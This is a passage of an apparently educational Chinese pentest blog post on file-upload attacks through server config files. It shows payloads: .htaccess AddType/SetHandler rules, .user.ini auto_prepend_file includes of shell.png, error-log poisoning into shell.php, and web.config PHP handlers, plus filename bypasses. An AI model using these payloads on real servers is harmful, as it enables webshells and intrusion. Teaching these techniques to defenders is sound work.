@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="引言文件上传漏洞是 Web 安全中最常见的高危漏洞之一。除了常规的图片马、后缀绕过之外，配置文件攻击是一类容易被忽视但威力极大的利用技巧。攻击者通过上传服务器配置文件（.htaccess、.user.ini、web.config 等），可以在不直接上传 Webshell 的情况下获取代码执行能力，绕过诸多防护措施。 本文将系统梳理基于配置文件的文件上传攻击手法，涵盖 Apache、IIS、Ngin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞：配置文件攻击">
+<meta property="og:url" content="https://congliang.github.io/File-upload-htaccess-attack/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="引言文件上传漏洞是 Web 安全中最常见的高危漏洞之一。除了常规的图片马、后缀绕过之外，配置文件攻击是一类容易被忽视但威力极大的利用技巧。攻击者通过上传服务器配置文件（.htaccess、.user.ini、web.config 等），可以在不直接上传 Webshell 的情况下获取代码执行能力，绕过诸多防护措施。 本文将系统梳理基于配置文件的文件上传攻击手法，涵盖 Apache、IIS、Ngin">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-07-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.876Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/File-upload-htaccess-attack/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/File-upload-htaccess-attack/","path":"File-upload-htaccess-attack/","title":"文件上传漏洞：配置文件攻击"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>文件上传漏洞：配置文件攻击 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81-htaccess-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="nav-number">2.</span> <span class="nav-text">一、.htaccess 配置文件攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E8%83%8C%E6%99%AF"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-AddType-%E2%80%94-%E5%B0%86%E4%BB%BB%E6%84%8F%E5%90%8E%E7%BC%80%E6%98%A0%E5%B0%84%E4%B8%BA-PHP"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 AddType — 将任意后缀映射为 PHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-AddHandler-%E4%B8%8E-SetHandler"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 AddHandler 与 SetHandler</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-number">2.4.</span> <span class="nav-text">1.4 绕过技巧</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81-user-ini-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="nav-number">3.</span> <span class="nav-text">二、.user.ini 配置文件攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E5%8E%9F%E7%90%86"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-auto-prepend-file-%E2%80%94-%E5%89%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 auto_prepend_file — 前置文件注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-auto-append-file-%E2%80%94-%E5%90%8E%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 auto_append_file — 后置文件注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6%E4%B8%8E%E6%89%A9%E5%B1%95"><span class="nav-number">3.4.</span> <span class="nav-text">2.4 利用限制与扩展</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81web-config-%E6%94%BB%E5%87%BB%EF%BC%88IIS%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">三、web.config 攻击（IIS）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-IIS-%E9%85%8D%E7%BD%AE%E4%BD%93%E7%B3%BB"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 IIS 配置体系</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E6%B3%A8%E5%86%8C%E8%87%AA%E5%AE%9A%E4%B9%89-Handler"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 注册自定义 Handler</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E5%85%B6%E4%BB%96%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 其他攻击面</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Nginx-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="nav-number">5.</span> <span class="nav-text">四、Nginx 配置文件攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E6%9C%BA%E5%88%B6%E5%B7%AE%E5%BC%82"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 机制差异</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-include-%E6%8C%87%E4%BB%A4%E6%BB%A5%E7%94%A8"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 include 指令滥用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-Nginx-PHP-FPM-%E8%81%94%E5%8A%A8"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 Nginx + PHP-FPM 联动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="nav-number">5.4.</span> <span class="nav-text">4.4 配置文件泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81PHP-FPM-%E9%85%8D%E7%BD%AE%E8%A6%86%E7%9B%96"><span class="nav-number">6.</span> <span class="nav-text">五、PHP-FPM 配置覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E5%8A%A8%E6%80%81-php-ini-%E6%B3%A8%E5%85%A5"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 动态 php.ini 注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-PHP-FPM-%E7%AB%AF%E5%8F%A3%E6%9A%B4%E9%9C%B2-SSRF"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 PHP-FPM 端口暴露 + SSRF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="nav-number">7.</span> <span class="nav-text">六、竞态条件攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E5%AE%9E%E6%88%98-PoC-%E7%A4%BA%E4%BE%8B"><span class="nav-number">8.</span> <span class="nav-text">七、实战 PoC 示例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-htaccess-%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%84%E5%90%88"><span class="nav-number">8.1.</span> <span class="nav-text">7.1 .htaccess + 图片马组合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-user-ini-%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%84%E5%90%88"><span class="nav-number">8.2.</span> <span class="nav-text">7.2 .user.ini + 图片马组合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-web-config-%E4%B8%8A%E4%BC%A0"><span class="nav-number">8.3.</span> <span class="nav-text">7.3 web.config 上传</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="nav-number">9.</span> <span class="nav-text">八、防御方案</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%8E%A7%E5%88%B6"><span class="nav-number">9.1.</span> <span class="nav-text">8.1 文件上传控制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A0%E5%9B%BA"><span class="nav-number">9.2.</span> <span class="nav-text">8.2 服务器加固</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1"><span class="nav-number">9.3.</span> <span class="nav-text">8.3 纵深防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-%E7%9B%91%E6%8E%A7%E5%91%8A%E8%AD%A6"><span class="nav-number">9.4.</span> <span class="nav-text">8.4 监控告警</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E5%B8%B8%E8%A7%81%E8%AF%AF%E5%8C%BA"><span class="nav-number">10.</span> <span class="nav-text">九、常见误区</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">11.</span> <span class="nav-text">结语</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/File-upload-htaccess-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="文件上传漏洞：配置文件攻击 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件上传漏洞：配置文件攻击
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-07-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-07-01T08:00:00+08:00">2025-07-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>文件上传漏洞是 Web 安全中最常见的高危漏洞之一。除了常规的图片马、后缀绕过之外，<strong>配置文件攻击</strong>是一类容易被忽视但威力极大的利用技巧。攻击者通过上传服务器配置文件（<code>.htaccess</code>、<code>.user.ini</code>、<code>web.config</code> 等），可以在不直接上传 Webshell 的情况下获取代码执行能力，绕过诸多防护措施。</p>
+<p>本文将系统梳理基于配置文件的文件上传攻击手法，涵盖 Apache、IIS、Nginx 等主流服务器，并提供完整的防御方案。</p>
+<h2 id="一、-htaccess-配置文件攻击"><a href="#一、-htaccess-配置文件攻击" class="headerlink" title="一、.htaccess 配置文件攻击"></a>一、.htaccess 配置文件攻击</h2><h3 id="1-1-背景"><a href="#1-1-背景" class="headerlink" title="1.1 背景"></a>1.1 背景</h3><p><code>.htaccess</code> 是 Apache 的分布式配置文件。当 <code>AllowOverride</code> 未设为 <code>None</code> 时，目录下的 <code>.htaccess</code> 可以被解析生效。攻击者若能上传此文件，即可修改该目录的解析规则。</p>
+<h3 id="1-2-AddType-—-将任意后缀映射为-PHP"><a href="#1-2-AddType-—-将任意后缀映射为-PHP" class="headerlink" title="1.2 AddType — 将任意后缀映射为 PHP"></a>1.2 AddType — 将任意后缀映射为 PHP</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
+
+<p>上传后，该目录下所有 <code>.png</code> 文件将被作为 PHP 执行。攻击者上传带 PHP 代码的图片即可获得 Webshell。</p>
+<p><strong>自包含 Payload（将 .htaccess 自身当作 PHP 执行）：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .htaccess</span><br><span class="line"><span class="comment"># &lt;?php phpinfo(); ?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-AddHandler-与-SetHandler"><a href="#1-3-AddHandler-与-SetHandler" class="headerlink" title="1.3 AddHandler 与 SetHandler"></a>1.3 AddHandler 与 SetHandler</h3><p><code>AddHandler</code> 比 <code>AddType</code> 更直接：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddHandler</span> application/x-httpd-php .jpg</span><br><span class="line"><span class="attribute">AddHandler</span> php5-script .gif</span><br></pre></td></tr></table></figure>
+
+<p><code>SetHandler</code> 最为激进——该目录下<strong>所有文件</strong>无论后缀都按 PHP 执行：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-绕过技巧"><a href="#1-4-绕过技巧" class="headerlink" title="1.4 绕过技巧"></a>1.4 绕过技巧</h3><p><strong>文件名绕过：</strong></p>
+<ul>
+<li>大小写变体（Windows）：<code>.HtAccess</code>、<code>.htacceSS</code></li>
+<li>NTFS 流：<code>.htaccess::$DATA</code></li>
+<li>Unicode 等价字符编码</li>
+</ul>
+<p><strong>内容绕过 — 构造”图片马”.htaccess：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># GIF89a</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
+
+<p>文件以 <code>#</code> 开头，后续可追加任意二进制数据。图片头标识被注释掉，同时能通过 <code>getimagesize()</code> 等函数的前几字节检查。</p>
+<h2 id="二、-user-ini-配置文件攻击"><a href="#二、-user-ini-配置文件攻击" class="headerlink" title="二、.user.ini 配置文件攻击"></a>二、.user.ini 配置文件攻击</h2><h3 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h3><p>PHP 5.3.0+ 在 CGI&#x2F;FastCGI 模式下支持 <code>.user.ini</code>，用于覆盖 <code>php.ini</code> 中的部分配置。该特性不限于 Apache——Nginx、IIS 等同样受影响。</p>
+<p>生效条件：<code>user_ini.filename</code> 为默认值 <code>.user.ini</code> 且 <code>user_ini.cache_ttl</code> &gt; 0。</p>
+<h3 id="2-2-auto-prepend-file-—-前置文件注入"><a href="#2-2-auto-prepend-file-—-前置文件注入" class="headerlink" title="2.2 auto_prepend_file — 前置文件注入"></a>2.2 auto_prepend_file — 前置文件注入</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=shell.png</span><br></pre></td></tr></table></figure>
+
+<p>攻击流程：</p>
+<ol>
+<li>上传 <code>.user.ini</code>，内容如上</li>
+<li>上传包含 PHP 代码的 <code>shell.png</code></li>
+<li>访问该目录下<strong>任意 PHP 文件</strong>（即使空文件或正常业务 <code>.php</code>）</li>
+<li><code>shell.png</code> 在被访问的 PHP 脚本执行前自动包含，代码被执行</li>
+</ol>
+<h3 id="2-3-auto-append-file-—-后置文件注入"><a href="#2-3-auto-append-file-—-后置文件注入" class="headerlink" title="2.3 auto_append_file — 后置文件注入"></a>2.3 auto_append_file — 后置文件注入</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_append_file</span>=shell.png</span><br></pre></td></tr></table></figure>
+
+<p>在 PHP 脚本执行完成后自动包含指定文件，可与 <code>auto_prepend_file</code> 组合使用，实现双向注入。</p>
+<h3 id="2-4-利用限制与扩展"><a href="#2-4-利用限制与扩展" class="headerlink" title="2.4 利用限制与扩展"></a>2.4 利用限制与扩展</h3><ul>
+<li><code>user_ini.cache_ttl</code> 默认 300 秒，上传后需等待缓存过期（或并发高频请求撞窗口）</li>
+<li>部分场景下需要 PHP 进程重载才能生效</li>
+<li>攻击范围覆盖当前目录及所有子目录</li>
+</ul>
+<p><strong>结合日志 &#x2F; session 投毒：</strong></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 将错误日志导向 .php 文件，随后触发可控错误写入恶意代码</span></span><br><span class="line"><span class="attr">error_log</span>=/var/www/html/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>或利用 <code>session.upload_progress</code> 将可控内容写入 session 文件，再通过 <code>.user.ini</code> 包含执行。</p>
+<h2 id="三、web-config-攻击（IIS）"><a href="#三、web-config-攻击（IIS）" class="headerlink" title="三、web.config 攻击（IIS）"></a>三、web.config 攻击（IIS）</h2><h3 id="3-1-IIS-配置体系"><a href="#3-1-IIS-配置体系" class="headerlink" title="3.1 IIS 配置体系"></a>3.1 IIS 配置体系</h3><p>IIS 7+ 使用 XML 配置文件。<code>web.config</code> 可放置在网站目录下覆盖上层配置。允许上传 <code>web.config</code> 意味着攻击面极大。</p>
+<h3 id="3-2-注册自定义-Handler"><a href="#3-2-注册自定义-Handler" class="headerlink" title="3.2 注册自定义 Handler"></a>3.2 注册自定义 Handler</h3><p>将 <code>.png</code> 等非脚本后缀交给 PHP 处理：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handlers</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;php_png&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*.png&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;*&quot;</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">modules</span>=<span class="string">&quot;CgiModule&quot;</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">scriptProcessor</span>=<span class="string">&quot;C:\php\php-cgi.exe&quot;</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">resourceType</span>=<span class="string">&quot;Unspecified&quot;</span> <span class="attr">requireAccess</span>=<span class="string">&quot;Script&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果 IIS 已配置 PHP FastCGI，更简洁：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;attack&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*.jpg&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;*&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">modules</span>=<span class="string">&quot;FastCgiModule&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">scriptProcessor</span>=<span class="string">&quot;C:\php\php-cgi.exe&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">resourceType</span>=<span class="string">&quot;Unspecified&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-其他攻击面"><a href="#3-3-其他攻击面" class="headerlink" title="3.3 其他攻击面"></a>3.3 其他攻击面</h3><ul>
+<li><strong>关闭请求过滤</strong>：<code>&lt;fileExtensions allowUnlisted=&quot;true&quot; /&gt;</code> 绕过上传限制</li>
+<li><strong>目录浏览泄露</strong>：<code>&lt;directoryBrowse enabled=&quot;true&quot;&gt;</code></li>
+<li><strong>重写规则注入</strong>：通过 <code>&lt;rewrite&gt;</code> 构造恶意代理规则</li>
+<li><strong>禁用安全模块</strong>：卸载 <code>RequestFilteringModule</code></li>
+</ul>
+<p>IIS + PHP 部署通常使用 FastCGI 模式，因此 <code>.user.ini</code> 同样适用，是跨平台的通杀手法。</p>
+<h2 id="四、Nginx-配置文件攻击"><a href="#四、Nginx-配置文件攻击" class="headerlink" title="四、Nginx 配置文件攻击"></a>四、Nginx 配置文件攻击</h2><h3 id="4-1-机制差异"><a href="#4-1-机制差异" class="headerlink" title="4.1 机制差异"></a>4.1 机制差异</h3><p>Nginx 没有目录级分布式配置文件——这是设计哲学上的差异，无法像 Apache 或 IIS 那样上传特定文件直接覆盖目录解析规则。但攻击面依然存在。</p>
